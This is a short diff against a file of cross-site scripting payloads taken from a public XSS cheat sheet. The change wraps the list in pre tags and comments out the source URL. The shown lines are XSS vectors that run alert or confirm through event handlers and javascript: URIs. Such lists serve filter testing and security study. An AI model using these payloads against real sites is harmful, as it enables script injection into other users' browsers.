@@ -1,4 +1,5 @@
-https://gbhackers.com/top-500-important-xss-cheat-sheet/
+<pre>
+# https://gbhackers.com/top-500-important-xss-cheat-sheet/
 <body oninput=javascript:alert(1)><input autofocus>
 <math href="javascript:javascript:alert(1)">CLICKME</math> <math> <maction actiontype="statusline#http://google.com" xlink:href="javascript:javascript:alert(1)">CLICKME</maction> </math>
 <frameset onload=javascript:alert(1)>
@@ -497,3 +498,4 @@ g'"></IFRAME>Hover the cursor to the LEFT of this Message</h1>&ParamHeight=250
 <img/src=`` onerror=this.onerror=confirm(1) 
 <form><isindex formaction="javascript&colon;confirm(1)"
 <img src=``&NewLine; onerror=alert(1)&NewLine;
+</pre>
